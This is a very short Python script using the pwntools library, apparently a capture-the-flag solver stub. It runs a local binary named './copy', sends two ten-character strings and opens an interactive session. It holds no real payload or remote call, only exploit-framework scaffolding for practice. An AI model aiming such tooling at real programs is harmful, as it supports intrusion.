#!/usr/bin/env python

from pwn import *

proc = process("./copy")

print proc.recvuntil("...")
proc.send("0" * 10)
proc.send("1" * 10)

proc.interactive()

